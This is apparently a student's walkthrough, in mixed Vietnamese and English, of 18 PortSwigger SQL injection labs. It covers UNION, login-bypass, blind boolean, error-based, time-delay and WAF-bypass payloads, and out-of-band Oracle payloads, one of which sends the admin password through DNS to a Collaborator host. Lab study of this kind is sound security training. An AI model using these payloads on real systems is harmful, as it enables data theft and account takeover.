# Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

>  This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

      SELECT * FROM products WHERE category = 'Gifts' AND released = 1

> To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

> SQL boolean based : là 1 kiểu chèn câu truy vấn với giá trị true bằng cách sử dụng 'OR , 'AND  kết hợp comment '--, "--, '# nhưng nhớ là nó phản hồi thông báo ta có thể xác định được.

=> goal: display 1 hay nhiều những produt chưa được phát hành 

- step 1 : Recon

      + xác định được vị trí có khả năng có lỗ hổng nằm ở category product check input ở url verify bằng http method GET ta sẽ chèn 1 quote = '

EX:

        https://0a7d004803a4224c80d56c540074003b.web-security-academy.net/filter?category=Accessories'

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/814fd0c0-85b5-42d4-83e9-0e7c0764360f)

+ ta thấy khi chèn quote = ' -> server sql không lọc được special char và bị interupt bới ' dẫn đến error 500 là bên server 

=> xác định được vị trí chèn sql injection.

explain: quote ' hay " Khi các dấu nháy này không được xử lý đúng cách hoặc không được thoát đúng cách, chúng có thể làm gián đoạn cú pháp của truy vấn SQL 

      SELECT * FROM demo where Name = 'Created by'OR 1=1 -- '  OR Name = 'SQL Online'

=> sẽ hiển thị toàn bộ data khi mình truy vấn ra

> Exploit

Payload: 

       SELECT * FROM products WHERE category = 'Accessories' OR 1=1 --' AND released = 1

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/89919f7b-019d-4be8-9951-4ed382d7ea12)

> solution

=> Sử Dụng Prepared Statements và Parameterized Queries



# Lab 2: SQL injection vulnerability allowing login bypass

>  This lab contains a SQL injection vulnerability in the login function. To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

=> goal là access vào tài khoản administartor

+ step 1 : Recon

  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/cb29a8c4-620f-43ba-a2f5-6bc421ce2520)


   - sau khi kiểm tra bằng quote ' thì lỗi server đang ở chức năng username input
 
   - khi nhập quote và username và password sẽ hiện ra thông báo invalid tức là theo trường hợp nối câu lệnh sql thì password vẫn xử lí thoát dấu '
 


> exploit

Payload: 

      administrator';--

=> select * from users where username = 'administrator' -- And password = '' => password bị comment 

=> username administrator là hợp lệ còn password là bypass

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/7a14b8dd-5067-4fc4-a4e4-a5443670206c)

> solution

=> tương tự lab 1 


# Lab 3 : SQL injection attack, querying the database type and version on Oracle

>  This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. To solve the lab, display the database version string. 

> UNION để kết hợp kết quả từ nhiều truy vấn SELECT vào một tập kết quả duy nhất. Mục đích của tấn công này là truy xuất dữ liệu từ các **bảng khác** mà kẻ tấn công không được phép truy cập

HINT:
>  On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

> There is a built-in table on Oracle called dual which you can use for this purpose. For example: 
            
            UNION SELECT 'abc' FROM dual  

> dual là dummy table để test injection

+ step 1: Recon

+ chèn ' vào url để test output trả về nếu lỗi internal server thì có thể confirm là lỗi phía server do database k xử lí được

 => ta có thể check 1 số thông tin về bảng 

C1: dùng với order by => nếu vượt quá số bảng sẽ thông báo lỗi 

        'order by [num];--

C2: dùng với UNION select null => nếu đủ thông tin về số cột được select thì không báo lỗi còn lại thì báo lỗi

      'UNION select null,null...;--


+ sau khi check ' thì ra thông báo lỗi

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/684b8a40-a2b9-4e50-9abf-feefb6549242)

+ check cột thì xác định là có 2 cột = 'order by 3 -- => lỗi

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/60a64355-0cc1-49bd-ad9d-440b418ca141)

+ step 2: Exploit

ta sẽ dùng payload :

      'union select null, banner from v$version --

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/3039208e-5ad0-4ced-81ba-a5644fbaf5d6)

+ provide số cột hợp lệ là null , banner (null có thể là bất cứ char hay number gì )

+ from table v$version

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/bb3a6255-a397-4eaf-a972-1422cf29d343)

=> solve lab 3


# Lab 4: SQL injection attack, querying the database type and version on MySQL and Microsoft

>  This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.To solve the lab, display the database version string. 

=> goal: display database version 

+ step 1:Recon

  - sử dụng query ' như lab trên và check hệ thống error
 
  - checking số cột => 'order by 2 -- - => bypass filter bằng khoảng trắng nhưng vẫn hợp lệ

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/70d9f358-6726-4abe-aa14-d21d1c3d6cb3)

=> chỉ có 2 cột 

  - dùng brup suite thì check qua comment # -> dùng cho mysql dbms

+ step 2: Exploit

- payload:

      SELECT @@version => 'union select null , @@version -- -

=> vì ta check dần thông tin về database version trên portswigger cheat sheet

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/01f1c317-2574-4514-ba7b-cc72e721c435)

=> solve lab 4


# Lab 5: SQL injection attack, listing the database contents on non-Oracle databases

>  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

> To solve the lab, log in as the administrator user.

+ step 1: Recon

 - check quote ' xem có lỗ hổng không và => có

 - check thông tin số cột dùng order by => 'order by 3 -- => lỗi => 2 cột

   ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/8e6ff1fd-08df-4cdb-912c-40bf1fa20284)

- check version của sql => PostgreSQL

      'union select null , version() --

  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/64735103-37c5-4e7e-b217-7c580598c888)

+ step 2: Exploit

- dựa vào cheat sheet ta sẽ exploit content của dbms postgreSQL ta có thông tin về cột của dbms đó là 2

=> payload : 

      'UNION SELECT null, table_name FROM information_schema.tables --
      
      'UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 'users_whkkxc' --

- information_schema: là một schema (bảng tham chiếu hệ thống) mặc định có sẵn trong hầu hết các hệ quản trị cơ sở dữ liệu (như MySQL, PostgreSQL, SQL Server) để lưu trữ các thông tin về cơ sở dữ liệu, bao gồm cả tên các bảng.

=> chứa gồm nhiều bảng 

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/aff51f6e-4db5-4932-ae12-712842a8656c)

=> thông tin về : table_name = 'users_whkkxc'

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/c23e27b8-abba-4a6f-8610-8aa406912a51)

=> tìm được 2 cột là username_aamfgq và password_lezury

=> final payload 

      'union select username_aamfgq,password_lezury  from users_whkkxc --

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/137e3435-29cc-41db-aac5-d569acf3def4)

=> username = administrator và password = udoct5pqg8rifxz14fbh



=>> solve lab 5

# Lab 6 : SQL injection attack, listing the database contents on Oracle

>  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

> To solve the lab, log in as the administrator user.

+ step 1: Recon

  - như bài trên khi test cột thì ta có số cột bằng 2
 
  - với bài này ta xác định được database này là orale
 
+ step 2 : Exploit

payload: 

      'union select null, table_name from all_tables --
            
![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/219c0904-727c-48d1-b02b-370d010f293a)

=> tables là USERS_ROYLCF

      'union select null, column_name from all_tab_columns where table_name = 'USERS_ROYLCF' --
      
![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/2cc8cdb1-e5e6-41aa-8bb4-15aecf11da46)

=> column là USERNAME_HDIDAS và PASSWORD_RQTIMB

      'union select USERNAME_HDIDAS, PASSWORD_RQTIMB from USERS_ROYLCF --
      
![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/c99b76a6-24af-41ac-9328-40f291dcf408)

=> username = administator và password = rz22yzn292lb4uq4ex5e


=>> solve lab 6


# Lab 7: SQL injection UNION attack, determining the number of columns returned by the query

>  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

> To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

=> goal:  số cột null được  add trả về query trên SQL 
+ step 1:Recon

  - check số cột ta có 3 cột -> 'order by 4 -- => error
 
  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/0c180061-e99f-40e5-8436-454ab971614e)

  => mục tiêu là  additional row containing null values

+ step 2: Exploit

  payload:

        'union select NULL,NULL,null --

  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/1f2fda15-9f94-42cb-a7dd-5ac626ecbc51)

=> solve lab 7


# Lab 8: SQL injection UNION attack, finding a column containing text

>  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

> The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

+ step 1: Recon

  - như bài trên số cột là 3
 
  => tìm kiếm cột chứa text string

+ step 2 : Exploit

  payload:

        'UNION select null,null,null --

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/9f1c3537-f29d-4ca1-9ff3-9a1e06c743be)

=> để trả về value hợp lệ tương ứng số cột và ta sẽ dò kí tự với từng cột 

=> nó ở cột 2 

      'union select null,'bSbgdS',null --

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/fcfde308-c815-49df-a8ac-4291084608df)

=> solve lab 8.

# Lab 9: SQL injection UNION attack, retrieving data from other tables

>  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

> The database contains a different table called users, with columns called username and password.

> To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

=> goal: lấy username và password từ bảng users 

+ step 1: Recon

  - checking số cột là 2 vì đề bài là username và password tại table users

=> exploit luôn về chỉ cần lấy thông tin của username và password 

+ step 2

  payload:

        'union select username , passsord from users --

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/de297d0d-b50c-4e0f-b204-68d31915290d)

=> đây là là 1 list của username và password đã được injection query -> username = administartor & password = id6y6c8xjtu63s5hbiro

=>> solve lab 9

# Lab 10: SQL injection UNION attack, retrieving multiple values in a single column

>  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

> The database contains a different table called users, with columns called username and password.

> To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

+ step 1: Recon

  - vì giống lab 9 chỉ có username và password thì chỉ có 2 cột
 
  - testing:'union select username , password -- => error
 
  - có thể vì username và password đã gộp lại thành 1 cột 
 
+ step 2: Exploit

  payload:

            'union select null, username ||'+'|| password from users --

  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/0e031162-d7e6-4b83-9a7c-ebcc5986dee8)

=> solve lab 10 


# Lab 11: Blind SQL injection with conditional responses

>  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

> The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user.

> blind sqli là 1 dạng sqli mà ta không thể thấy bằng dạng phản hồi bằng text từ server giống như 1 dạng phản hồi json list danh sách mà được trả về dạng True false ex: character hay giá trụ đúng với thành phần database trên server => dump all data in server


+ step 1: Recon

  - sau khi check category bằng quote ta thấy không nhận lại được dấu hiệu gì liên quan đến error server hay trả về phản hổi gì khác
 
  - ta chú ý đến text welcome back! và cookie mục tracking id được gợi ý => check quote ' trên trackid không trả về welcome back! và thêm AND 1=1 -- thì nó lại trả về welcome back
 
  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/1680b6a9-180c-468e-b0f6-1644bf456831)


=> ta cũng có thể sử dụng or với giá trị trackid là không hợp lệ cũng được => or là chọn ra 1 trường hợp khác để chèn 

  + payload test table exsited

  ```
      'and (select 'abc' from users limit 1) = 'abc' -- 
  ```

+ chèn 1 row 'abc' vào bảng users => check có phải table users 

+ limit 1 là chỉ nhận 1 column trong bảng

+ ='abc' : check true false có phải select 'abc' không


EX:

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/2ae80387-b410-454e-b6d0-088178f91804)

=> true = 1 còn false = 0

=> ta đã có thông tin về hành vi của trang web và lỗ hổng 


+ step 2: Exploit

  - tìm length của password

      c1: dùng brupsuite 
  
      - payload :
   
              'and (select 'a' from users where username = 'administrator' and length(password) > i) = 'a' --

      + i là số phải tìm có thể > 1 nhưng đến > 21 là false thì dùng => biết được số chứa kí tự trong password

   ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/8a47545f-ed22-4915-affb-b6fa3201b2f2)

  => grep match là pin phần có trả về welcome back!

  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/a456bdc9-e07e-472e-a878-720ad451fc1f)


 => length của password = 19 

- final payload

              'and (select substring(password,1,1) from users where username = 'administrator') = '{c}' -- 

  - SUBSTR(substring)(expression, start, length): ví dụ nếu độ dài length mà ta cho là 19 => {c} sẽ brute force lâu hơn là setup start là từng kí tự

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/dfbb823f-e00e-4846-a98e-f03a366a865b)

+ ta sẽ được string như thế này tiếp tục sẽ thành password

=> solve lab 11

# Lab 12: Blind SQL injection with conditional errors

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

> To solve the lab, log in as the administrator user.

+ step 1: Recon

  - checking qua web thì có vẻ chưa thấy có dấu hiệu gì nên sử dụng single quote cho tracking id thì ta nhận được error 500

  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/15764768-7f08-45b0-b378-f5d5215901d4)

  - sau khi sử dụng 'OR 1=0 -- thì nó trả về hợp lệ => ta có thể cho rằng cấu trúc syntax của sql này sẽ là đúng và hợp lệ thì nó sẽ trả về 200 chứ không phải xử lí điều kiện bên trong là true hay false
 
![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/74e96c46-7752-4543-bcd2-01a82c98c17d)

- ta có thể recon cột bảng của database trong page

  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/253b3b27-4090-4017-8735-434aee49e203)




+ step 2: Exploit

  - ta sẽ sử dụng case (giống như if then)

syntax:

  ```
            CASE
    WHEN condition1 THEN result1
    WHEN condition2 THEN result2
    ...
    ELSE resultN
      END

  ```
 
  - payload:

      ``` 'OR (select case when (1=0) then to_char(1/0) else 'a' end from dual) = 'a' --```

    + **when(false) : nó sẽ chuyển sang câu lệnh else và ngược lại nếu true thì sẽ sang then là error**
   
    + to_char : trong SQL được sử dụng để chuyển đổi các giá trị số và ngày tháng thành chuỗi ký tự với định dạng cụ thể => định dạng dữ liệu 

=> TO_CHAR(1/0) thực tế không chuyển đổi bất kỳ giá trị nào vì phép chia 1/0 gây ra lỗi chia cho 0 (division by zero).

- tính length:

      ```'OR (select case when length(password) > i then to_char(1/0) else 'a' end from users where username = 'administrator') = 'a' --```

  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/c956f323-2ecb-4fb0-b29a-8d481951d210)


=> ta có length = 20 vì set length(password)> 19 tức 20 kí tự 

- payload solve:

  ```'OR (select case when substr(password,i,1) = '{c}'  then to_char(1/0) else 'a' end from users where username = 'administrator')='a' --```

  ```'OR (SELECT CASE WHEN SUBSTR(password, i, 1) = '{c}' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username = 'administrator') IS NULL --```

+ substring chỉ dùng trên sql server thui còn SUBSTR có thể dùng các dbms khác trừ sql server

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/73997a23-fcc4-40f9-bd4a-e236d9d486e9)

=> tiếp tục sẽ tìm ra password của user admin

=> solve lab 12

# Lab 13: Visible error-based SQL injection

>  This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned. The database contains a different table called users, with columns called username and password.

> To solve the lab, find a way to leak the password for the administrator user, then log in to their account.

+ step 1: Recon

  - bài này là dạng visible error base tức là sẽ có thể check được respond verbose trên page

  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/eecca9ba-7e34-4ba3-84fd-3ef844222845)


=> hiện ra thông tin lỗi về sql dạng này là cơ bản nên ít khi vào 

 - ta cho thêm -- comment thi nó sẽ thành valid query sql

+ step 2 : exploit

 - ta sẽ sử dụng cast trong sql => dùng để chuyển đổi dữ liệu giống ép kiểu

- payload test : 

      'OR 1=CAST((select 1) AS INT) --

  => ta chèn 1 as int thì tạo ra chuỗi query hợp lệ còn khi chuyển select 1 thành select 'abc' thì => k hợp lệ vì abc k phải là integer lẫn không tồn tại trong thành phần bảng đó

  - payload 2:

          'OR 1=CAST((select username from users)AS INT)--

    ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/e3e54728-76a4-4ed8-a1af-a335fb2b5a30)


=> hiện ra thông báo về độ dài của query hơi dài nên đã chèn mất phần INT -> chỉ cần loại bỏ cookie trackid là xong

- khi loại bỏ thì ta thấy có 1 thông báo

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/1b164cb2-c524-4942-9089-394adfb5fdba)

=> nhiệm vụ set up limit 1 cho query trên

- payload solve:

            'OR 1=CAST((SELECT password from users limit 1)AS INT )-- 

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/8c2d755f-4e01-46f8-8897-dfa2a66071b3)

=> solve lab 13

# Lab 14: Blind SQL injection with time delays

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

> To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

+ step 1: Recon
  
   -  trong này vì yêu cầu delay nên ta sẽ sử dụng sleep function
 
   -  lỗ hổng blind này vẫn khai thác ở trackid vì sau khi check có vẻ nó không hiện thông tin về lỗ hổng vì là blind nên ta sẽ check hành vi bằng cách sử dụng sleep
 
+ step 2 : Exploit

  payload:

        '||pg_sleep(10)--

  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/afca2623-5a9f-4989-90f0-7d5b906d21b3)


=> ta nhìn vào millis là 5,.. đã ngắt được 5s 

=> solve lab 14

# Lab 15: Blind SQL injection with time delays and information retrieval

>  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

> To solve the lab, log in as the administrator user. 

+ step 1: Recon

  - ta có payload check bài trên là ||pg_sleep --

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/49ca2e6f-91ea-4f72-bee3-f51b01905650)

+ step 2 :Exploit
      - payload test:
  
          '||(select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end ) --
- false thì chạy else còn true chạy then 

  - find password length :

          '||(select case when (username='administrator' and length(password) > i) then pg_sleep(10) else pg_sleep(-1) end from users) --

            or

          '||(select case when length(password) > i then pg_sleep(10) else pg_sleep(-1) end  from users where username = 'administrator') --

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/dd71f72e-3470-4f32-bc0b-f76fabc94288)

=> vì length > 19 => là kí tự nó sẽ 20 digits

 - payload solve:

         '||(select case when substring(password,i,1) = '{c}' then pg_sleep(10) else pg_sleep(-1) end  from users where username = 'administrator') --

+ ta sẽ dùng chức năng respond received trên columns => ta sẽ điều chỉnh 1 luồng để sử lí tiến trình cụ thể hơn

+ vì sleep 10 hơi lâu nên để sleep 5 => recevied > 5s

  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/c32e179d-d07e-45a8-9832-337eccb36ad6)

=> solve lab 15

# Lab 16: Blind SQL injection with out-of-band interaction

>  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

> To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. 

+ step 1: Recon

  - ta có thông tin về đây là dạng outband sqli blind => giữa vào cheat sheet để solve
 
  - sử dụng brup collaborator để bắt dns lookup trên server
 
  - nơi xảy ra lỗ hổng nằm ở cookie track id

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/b52e817e-0be7-410d-bdc2-b863a1c25082)

=> auto check 
 
+ step 2: Exploit

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/a19ec7d9-2873-4e70-92c5-6ac985b454f6)


 - payload: 

     ```
     'UNION+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//e1gvypgsz74emr0nc7pqvo73wu2kq9.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)+--
     or

      UNION(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://e1gvypgsz74emr0nc7pqvo73wu2kq9.oastify.com/"> %remote;]>'),'/l') FROM dual)--

   ```

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/d65aa1d1-4328-435e-a1b0-a73b786dd587)

=> poll dns capture từ hệ thống hook dns 

=> solve lab 16

# Lab 17: Blind SQL injection with out-of-band data exfiltration

>  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

> To solve the lab, log in as the administrator user.

+ step 1 : Recon

  - ta cần exploit sql để lấy output của username và password

  - còn biết được là đây là dạng out-of-band sqli  => dbms oracle
 
+ step 2: Exploit

  payload:

       '|| SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username = 'administrator' )||'.qhb7e1w4fjkq23gzsj52b0nfc6ix6m.oastify.com/"> %remote;]>'),'/l') FROM dual

        or

       ' ||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users+where+username+%3d+'administrator'+)||'.qhb7e1w4fjkq23gzsj52b0nfc6ix6m.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual+)+--
  
![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/3cd32cd6-dd9c-4e6e-a3e9-df9c98a3e489)

=> password nằm ở dns poll now là 'esdwmb00nnzjq1iv4vfp'  vì sau .collab brup là select password nên => là nó

=> solve lab 17

# Lab 18: SQL injection with filter bypass via XML encoding

>  This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

> The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

> A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this. 

+ step 1: Recon

  - với bài này có vẻ lỗ hổng không nằm ở cookie nữa mà nằm ở chức năng stockcheck trong product id
 
  - khi ta checking với quote ' trên product và store check thì dích attack detected có lẽ bên server đang chặn lỗi và in ra detection

 ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/b8f64102-27c2-4aa0-9634-37a4475b4569)


 => ta cần tải extension hackvertor bypass WAF filter với sql injection 

+ step 2: Exploit

  payload test :

      <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>2 UNION select NULL </storeId></stockCheck>

=> ta bị detected ở đây, nhiệm vụ là dùng encode trong extension để bypass -> obfuscating cái payload với XML 

- sử dụng hex-entities encoding

      <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId><@hex_entities>2 UNION select NULL<@/hex_entities> </storeId></stockCheck>

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/c356b5b9-3322-49d2-a064-68dd6f41903e)

=> đã chèn được 'a'  

payload solve : 

      <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId><@hex_entities>2 union select username||': '||password from users<@/hex_entities> </storeId></stockCheck>

![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/f366d345-6afe-4fd2-9a31-8f0b7c01133e)

=> solve lab 18
